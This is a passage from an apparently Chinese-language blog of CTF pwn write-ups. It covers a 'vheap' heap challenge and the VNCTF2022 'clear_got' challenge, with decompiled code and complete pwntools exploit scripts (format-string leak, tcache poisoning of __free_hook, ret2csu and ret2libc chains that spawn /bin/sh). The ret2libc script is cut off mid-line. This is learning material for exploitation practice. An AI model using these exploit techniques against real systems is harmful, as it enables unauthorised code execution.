class="hljs-identifier">num</span>)]</span> = Array2<span class="hljs-literal">[(<span class="hljs-identifier">char</span>)<span class="hljs-identifier">num</span>]</span><span class="hljs-operator"> * </span>Array2<span class="hljs-literal">[SBYTE1(<span class="hljs-identifier">num</span>)]</span>;<br>      return <span class="hljs-constructor">__readfsqword(0x28u)</span> ^ v2;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span> &gt; <span class="hljs-number">0xB2</span>u )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span><span class="hljs-operator"> == </span><span class="hljs-number">0xD2</span> )<br>      &#123;<br>        Array2<span class="hljs-literal">[SBYTE2(<span class="hljs-identifier">num</span>)]</span> = Array2<span class="hljs-literal">[SBYTE1(<span class="hljs-identifier">num</span>)]</span> - Array2<span class="hljs-literal">[(<span class="hljs-identifier">char</span>)<span class="hljs-identifier">num</span>]</span>;<br>        return <span class="hljs-constructor">__readfsqword(0x28u)</span> ^ v2;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span><span class="hljs-operator"> == </span><span class="hljs-number">0xC3</span> )<br>        Array2<span class="hljs-literal">[SBYTE2(<span class="hljs-identifier">num</span>)]</span> = Array2<span class="hljs-literal">[(<span class="hljs-identifier">char</span>)<span class="hljs-identifier">num</span>]</span> + Array2<span class="hljs-literal">[SBYTE1(<span class="hljs-identifier">num</span>)]</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span><span class="hljs-operator"> == </span><span class="hljs-number">0xB</span> )<br>    memcpy(*((void **)&amp;heaparray + (<span class="hljs-built_in">char</span>)num), (<span class="hljs-built_in">char</span> *)&amp;data + <span class="hljs-number">0x40</span><span class="hljs-operator"> * </span>(__int64)<span class="hljs-constructor">SBYTE2(<span class="hljs-params">num</span>)</span>, <span class="hljs-number">0x40</span>uLL);<span class="hljs-comment">// edit vul?</span><br>  <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span> &gt; <span class="hljs-number">0x7D</span>u )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span><span class="hljs-operator"> == </span><span class="hljs-number">0xBC</span> )<br>    &#123;<br>      Array2<span class="hljs-literal">[SBYTE2(<span class="hljs-identifier">num</span>)]</span> = Array2<span class="hljs-literal">[SBYTE1(<span class="hljs-identifier">num</span>)]</span> ^ Array2<span class="hljs-literal">[(<span class="hljs-identifier">char</span>)<span class="hljs-identifier">num</span>]</span>;<br>      return <span class="hljs-constructor">__readfsqword(0x28u)</span> ^ v2;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span> &gt; <span class="hljs-number">0xBA</span>u<span class="hljs-operator"> &amp;&amp; </span><span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span><span class="hljs-operator"> == </span><span class="hljs-number">0xC9</span> )<br>      Array2<span class="hljs-literal">[SBYTE2(<span class="hljs-identifier">num</span>)]</span> = Array2<span class="hljs-literal">[(<span class="hljs-identifier">char</span>)<span class="hljs-identifier">num</span>]</span> + Array2<span class="hljs-literal">[SBYTE1(<span class="hljs-identifier">num</span>)]</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIBYTE(<span class="hljs-params">num</span>)</span><span class="hljs-operator"> == </span><span class="hljs-number">0xC</span> )<br>  &#123;<br>    free(*((void **)&amp;heaparray + (<span class="hljs-built_in">char</span>)num));  <span class="hljs-comment">// free</span><br>    *((_QWORD *)&amp;heaparray + (<span class="hljs-built_in">char</span>)num) = <span class="hljs-number">0L</span>L;<br>  &#125;<br>  return <span class="hljs-constructor">__readfsqword(0x28u)</span> ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>首先检查指令是否合法；</li><li>然后根据指令的最高字节执行相应的功能</li></ol><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-number">0</span>xA : <span class="hljs-type">malloc</span><br><span class="hljs-number">0</span>xB : <span class="hljs-type">edit</span><br><span class="hljs-number">0</span>xC : <span class="hljs-type">free</span><br></code></pre></td></tr></table></figure><blockquote><p>其中edit功能由memcpy实现，把指定的0x40大小的数据片段复制到自定义大小（可以小于0x40）的堆中，因此存在堆溢出漏洞</p></blockquote><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ol><li>首先利用格式化字符串漏洞泄露处libc基址；</li><li>然后申请两个堆块，其中第一个堆块必须要小于0x28,确保可以覆盖第二个堆块的fd；</li><li>释放第二个堆块，使其进入tcache中，然后使用第一个数据片段堆溢出第一个堆块，修改第二个堆块的fd为<code>__free_hook</code>;</li><li>连续申请两次获取<code>__free_hook</code>的写入权限，利用第二个数据片段修改其为<code>system</code>;</li><li>释放第一个堆块（提前将其fd布置为<code>/bin/sh\x00</code>）触发<code>system(&quot;/bin/sh&quot;)</code>获取shell。</li></ol><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-comment"># flag&#123;freedom-love-freedom-for-life&#125;</span><br><br><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">context</span>.arch = &#x27;amd64&#x27;<br><span class="hljs-attribute">context</span>.os = &#x27;linux&#x27;<br><br><span class="hljs-attribute">REMOTE</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> REMOTE:<br>    <span class="hljs-attribute">p</span> = remote(&#x27;<span class="hljs-number">121.40.89.206</span>&#x27;,<span class="hljs-number">33468</span>)<br>    <span class="hljs-attribute">libc</span> = ELF(&#x27;/home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">27</span>-<span class="hljs-number">3</span>ubuntu1.<span class="hljs-number">5</span>_amd64/libc-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so&#x27;)<br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">p</span> = process(&#x27;./vheap&#x27;)<br>    <span class="hljs-attribute">libc</span> = ELF(&#x27;/home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">27</span>-<span class="hljs-number">3</span>ubuntu1.<span class="hljs-number">5</span>_amd64/libc-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so&#x27;)<br><br><span class="hljs-attribute">elf</span> = ELF(&#x27;./vheap&#x27;)<br><br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x555555554000+0x0D1D&quot;) # call _sprintf</span><br><span class="hljs-comment"># 格式化字符串漏洞泄露libc基址</span><br><span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot;first,tell me your name.\n&quot;</span>,&#x27;%<span class="hljs-number">2</span>$p&#x27;)<br><span class="hljs-attribute">p</span>.recvuntil(&#x27;<span class="hljs-number">0</span>x&#x27;)<br><span class="hljs-attribute">libc</span>.address = int(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x110031<br><span class="hljs-attribute">success</span>(hex(libc.address))<br><br><span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot;How many pieces of data?\n&quot;</span>,&#x27;<span class="hljs-number">2</span>&#x27;)<br><br><span class="hljs-attribute">payload1</span> = b&#x27;/bin/sh\x00&#x27; + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>x31) + p64(libc.sym[&#x27;__free_hook&#x27;]) + p64(<span class="hljs-number">0</span>x0)*<span class="hljs-number">3</span><br><span class="hljs-attribute">payload2</span> = p64(libc.sym[&#x27;system&#x27;]) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span><br><span class="hljs-attribute">p</span>.send(payload1)<br><span class="hljs-attribute">p</span>.send(payload2)<br><br><span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot;Size:\n&quot;</span>,&#x27;<span class="hljs-number">8</span>&#x27;) # 跟下面的指令个数一致，最多只能<span class="hljs-number">9</span>个<br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;+++]\n&quot;</span>)<br><br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x555555554000+0xEB1&quot;) # EFD 0x108C</span><br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x555555554000+0x109E&quot;) # malloc</span><br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x555555554000+0x123A&quot;) # edit</span><br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x555555554000+0xEAF&quot;) # main tail</span><br><br><span class="hljs-comment"># 发送指令</span><br><span class="hljs-attribute">p</span>.sendline(str(<span class="hljs-number">0</span>x0A011000)) # add <span class="hljs-number">0</span>x10 <span class="hljs-number">0</span><br><span class="hljs-attribute">p</span>.sendline(str(<span class="hljs-number">0</span>x0A012001)) # add <span class="hljs-number">0</span>x20 <span class="hljs-number">1</span><br><span class="hljs-attribute">p</span>.sendline(str(<span class="hljs-number">0</span>x0C011001)) # free <span class="hljs-number">1</span><br><span class="hljs-attribute">p</span>.sendline(str(<span class="hljs-number">0</span>x0B000000)) # edit <span class="hljs-number">0</span> overlapping chunk1&#x27;s fd<br><span class="hljs-attribute">p</span>.sendline(str(<span class="hljs-number">0</span>x0A012001)) # add <span class="hljs-number">0</span>x20 <span class="hljs-number">1</span><br><span class="hljs-attribute">p</span>.sendline(str(<span class="hljs-number">0</span>x0A012001)) # add <span class="hljs-number">0</span>x20 <span class="hljs-number">1</span><br><span class="hljs-attribute">p</span>.sendline(str(<span class="hljs-number">0</span>x0B010001)) # edit <span class="hljs-number">1</span> overlapping<br><span class="hljs-attribute">p</span>.sendline(str(<span class="hljs-number">0</span>x0C011000)) # free <span class="hljs-number">0</span> trigger free_hook<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-attribute">p</span>.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="0x5-Summary"><a href="#0x5-Summary" class="headerlink" title="0x5 Summary"></a>0x5 Summary</h2><p>感觉还是比较简单，利用思路清晰。唯一的困难就是逆向解析出指令的结构及其含义。</p><h2 id="0x6-Reference"><a href="#0x6-Reference" class="headerlink" title="0x6 Reference"></a>0x6 Reference</h2><ul><li><a href="https://www.bbsmax.com/A/amd0K3qL5g/">IDA逆向常用宏定义</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>fmtstr</tag>
      
      <tag>堆溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2022 PWN WriteUp</title>
    <link href="/2022/03/26/VNCTF2022-PWN-WriteUp/"/>
    <url>/2022/03/26/VNCTF2022-PWN-WriteUp/</url>
    
    <content type="html"><![CDATA[<h2 id="clear-got"><a href="#clear-got" class="headerlink" title="clear_got"></a>clear_got</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><ul><li>file clear_got</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">clear_got</span>: ELF <span class="hljs-number">64</span>-bit LSB executable, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>, for GNU/Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span>, BuildID[sha1]=<span class="hljs-number">0</span>da045c4b45eb17b78368ffbaff7e54e2bc130aa, not stripped<br></code></pre></td></tr></table></figure><ul><li>checksec：只是开启栈不可执行保护</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3ff000)</span><br></code></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">92</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-60h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+5Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">init</span>();<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to VNCTF! This is a easy competition.///&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>  v5 = (<span class="hljs-type">int</span>)&amp;PLT;<br>  <span class="hljs-built_in">memset</span>(&amp;PLT, <span class="hljs-number">0</span>, <span class="hljs-number">0x38</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序逻辑很清晰，就是先向一个只有96字节的数组输入0x100字节的数据（栈溢出），然后将GOT表项清零，导致无法再调用read、puts等函数。根据动态调试发现<code>__libc_start_main</code>函数的got表项没有被清零，所以存在libc地址。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400773</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400774</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400777</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>000000000040077E                 <span class="hljs-keyword">syscall</span>                 <span class="hljs-comment">; LINUX - sys_write</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400780</span>                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure><p>存在一处sys_write,并且可以通过rbp控制程序流程。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>由于无法调用read、puts等函数，那么只能尝试使用ret2syscall进行攻击，目标是执行<code>execv(&quot;/bin/sh&quot;,0,0)</code>,其中execv的系统调用号是0x3b。通过ROPgadget工具发现没有类似<code>pop rax;ret</code>和<code>pop rdx;ret</code>的gadget，导致我无法控制rax寄存器和rdx寄存器。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>000000000040074A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">38h</span> <span class="hljs-comment">; &#x27;8&#x27;  ; n</span><br><span class="hljs-symbol">.text:</span>000000000040074F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>          <span class="hljs-comment">; c</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400754</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span>        <span class="hljs-comment">; s</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400757</span>                 <span class="hljs-keyword">call</span>    _memset<br><span class="hljs-symbol">.text:</span>000000000040075C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400761</span>                 <span class="hljs-keyword">leave</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400762</span>                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure><p>通过观察发现main函数在结束的时候rdx&#x3D;0x38,rax&#x3D;0(read函数的调用号)，而read函数的返回值就是rax且其返回值由读取的字节数决定。因此可以尝试执行<code>read(0,bss,0x3b)</code>并输入0x3b字节的数据使rax&#x3D;0x3b。由于无法直接控制rdx，所以尝试使用ret2csu进行执行该函数。</p><blockquote><p>ret2csu中的call [r12],所以r12必须是指令的指针的指针，即指令的双重指针。</p></blockquote><p>由于GOT表项遭到破坏，所以elf.plt[“xxx”]就不满足该条件，所以不能使用其执行指令。但是r12必须满足该条件，否则报错，因此我们需要在程序中找一个指令的双重指针且保证执行前后寄存器不会变化。通过<a href="https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html">some-gadget-sequence-for-x8664-rop</a>发现<code>_DYNAMIC</code>处存在_init和_fini函数的地址，且两者都不影响寄存器的值。因此令r12为<code>_DYNAMIC</code>处的地址即可。</p><p>当ret2csu从第2个gadget执行回来时，由于<code>call [r12]</code>没有发挥作用，所以还需要gadget1中的<code>ret</code>来触发执行<code>read(0,bss,0x3b)</code>,此时我们可以写入所需参数，为了减少麻烦，我们也可以写入<code>syscall;ret</code>的地址,使再次执行gadget2时<code>call [r12]</code>发挥作用。</p><p>大致流程如下：<br><code>csu_gadget1(为了read准备寄存器rbx,rbp,r12~r15,read) --&gt; csu_gadget2（为了read修改寄存器rdi,rsi,rdx,）--&gt; csu_gadget1(为了execv准备寄存器rbx,rbp,r12~r15;执行read) --&gt; csu_gadget2(修改寄存器rdi,rsi,rdx;执行execv)</code></p><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><ol><li>首先使用sys_write泄露出libc基址；</li><li>然后通过sys_write的返回地址由rbp控制的特性，控制继续执行<code>mov eax, 0;leave;ret</code>控制rax，然后控制其他寄存器执行read函数，修改puts_got为system地址，puts_got+8为”&#x2F;bin&#x2F;sh”;</li><li>最后再执行puts(puts_got+8)即可。</li></ol><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><h4 id="ret2csu-1"><a href="#ret2csu-1" class="headerlink" title="ret2csu"></a>ret2csu</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br>&#x27;&#x27;&#x27;<br>@文件        :5.py<br>@说明        :ret2csu + read返回值控制rax + _init和_fini函数不会对寄存器进行修改<br>@时间        :2022/02/13 09:22:38<br>@作者        :sh0ve1<br>&#x27;&#x27;&#x27;<br><br>from pwn import *<br>import pwnlib<br><br>context.log_level = &#x27;debug&#x27;<br>context.arch = &#x27;amd64&#x27;<br>context.os = &#x27;linux&#x27;<br><br>REMOTE = 0<br>if REMOTE:<br>    p = remote(&#x27;node4.buuoj.cn&#x27;, 27076)<br>    libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br><span class="hljs-section">else:</span><br>    p = process(&#x27;./clear_got&#x27;)<br>    libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br><br>elf = ELF(&#x27;./clear_got&#x27;)<br><br>bss = elf.bss() + 0x100<br>syscall_ret = 0x40077e<br>csu_gadget1 = 0x4007EA<br>csu_gadget2 = 0x4007d0<br><br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x400762&quot;)</span><br><br>payload = b&#x27;A&#x27;*0x60 + p64(0xdeadbeef)<br><span class="hljs-comment"># 一开始rax=0 ，rdx=0x38</span><br>payload += p64(csu_gadget1)<br>payload += p64(0) <span class="hljs-comment"># rbx</span><br>payload += p64(1) <span class="hljs-comment"># rbp</span><br>payload += p64(0x600e40) <span class="hljs-comment"># r12 --&gt; call [r12] 0x600e50 _init</span><br>payload += p64(0x3b) <span class="hljs-comment"># r13=rdx</span><br>payload += p64(bss) <span class="hljs-comment"># r14=rsi</span><br>payload += p64(0) <span class="hljs-comment"># r15d=edi</span><br>payload += p64(csu_gadget2)<br>payload += b&#x27;B&#x27;*8 <br>payload += p64(0) <span class="hljs-comment"># rbx</span><br>payload += p64(1) <span class="hljs-comment"># rbp</span><br>payload += p64(bss + 8) <span class="hljs-comment"># r12 = double pointer of syscall_ret</span><br>payload += p64(0) <span class="hljs-comment"># r13=rdx</span><br>payload += p64(0) <span class="hljs-comment"># r14=rsi</span><br>payload += p64(bss) <span class="hljs-comment"># r15d=edi</span><br>payload += p64(syscall_ret) <span class="hljs-comment">#ret sys_read</span><br>payload += p64(csu_gadget2)<br><br>p.recvuntil(<span class="hljs-string">&quot;///\n&quot;</span>)<br>p.sendline(payload)<br>sleep(0.2)<br><span class="hljs-comment"># pause()</span><br>payload = b&#x27;/bin/sh\x00&#x27; + p64(syscall_ret) <span class="hljs-comment"># 写入参数和指令的地址（便于call [r12]）</span><br>payload = payload.ljust(0x3b,b&#x27;D&#x27;)<br>p.send(payload)<br><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h4 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@文件        :exp2.py</span><br><span class="hljs-string">@说明        :ret2libc</span><br><span class="hljs-string">@时间        :2022/02/13 09:22:38</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27076</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./clear_got&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./clear_got&#x27;</span>)<br><br>bss = elf.bss() + <span class="hljs-number">0x100</span><br>syscall_ret = <span class="hljs-number">0x40077e</span><br>pop_rdi = <span class="hljs-number">0x4007f3</span><br>pop_rsi_r15 = <span class="hljs-number">0x4007f1</span><br>sys_write = <span class="hljs-number">0x400773</span><br><span class="hljs-comment"># 0x000000000040075c: mov eax, 0; leave; ret;</span><br>mov_rax = <span class="hljs-number">0x40075c</span><br><br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x400762&quot;)</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x60</span> <br>payload += p64(mov_rax) <span class="hljs-comment"># rbp 关键 与sys_write配合</span><br><span class="hljs-comment"># 一开始rax=0 ，rdx=0x38</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi_r15) + p64(elf.got[<span 